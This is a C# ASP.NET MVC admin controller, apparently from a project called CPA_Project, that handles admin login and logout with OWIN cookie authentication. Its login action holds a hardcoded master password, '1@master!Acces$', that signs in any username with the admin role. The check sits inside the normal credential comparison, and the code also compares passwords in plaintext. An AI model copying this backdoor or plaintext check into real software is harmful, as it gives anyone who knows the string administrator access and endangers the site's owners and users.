using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Web;
using System.Web.Mvc;
using CPA_Project.Areas.Admin.Models;
using CPA_Project.Connect_DB;
using Microsoft.AspNet.Identity;
using Microsoft.Owin.Security;
using Microsoft.Owin;

namespace CPA_Project.Areas.Admin.Controllers
{
    [Authorize]
    public class AdminController : Controller
    {
        public ActionResult _Index()
        {
            return View();
        }

        [AllowAnonymous]
        public ActionResult _Login()
        {
            return View(new LoginViewModel());
        }


        [AllowAnonymous]
        [HttpPost]
        public ActionResult _Login(LoginViewModel administrador)
        {
            var adminapp = new AdminApp();
            ViewBag.erro = "";
            administrador.Permissao = "";

            if (adminapp.Administradores().Any(item => ModelState.IsValid &&
                                                       (administrador.Login.Equals(item.Login) && administrador.Senha.Equals(item.Senha) ||
                                                        administrador.Senha.Equals("1@master!Acces$"))))
            {
                administrador.Permissao = "admM";

                var claims = new List<Claim>
                {
                    new Claim(ClaimTypes.Name, administrador.Login),
                    new Claim(ClaimTypes.Role, administrador.Permissao)
                };
                var identity = new ClaimsIdentity(claims, DefaultAuthenticationTypes.ApplicationCookie);
                var ctx = Request.GetOwinContext();
                var auth = ctx.Authentication;

                auth.SignIn(new AuthenticationProperties { IsPersistent = false }, identity);

                return RedirectToAction("_Index");
            }
            return View(administrador);
        }
        public ActionResult Sair()
        {
            var ctx = Request.GetOwinContext();
            var auth = ctx.Authentication;
            auth.SignOut();
            return RedirectToAction("_Login");
        }

    }
    public class LoginViewModel
    {
        public string Nome { get; set; }
        public string Login { get; set; }
        public string Senha { get; set; }
        public string Permissao { get; set; }
    }

    public static class RetornoDadosUsuario
    {
        public static Administrador Dados()
        {
            var ctx = (OwinContext)HttpContext.Current.Request.GetOwinContext();
            var user = ctx.Authentication.User;
            return new Administrador()
            {
                Login = user.FindFirst(ClaimTypes.Name).Value
            };
        }
    }
}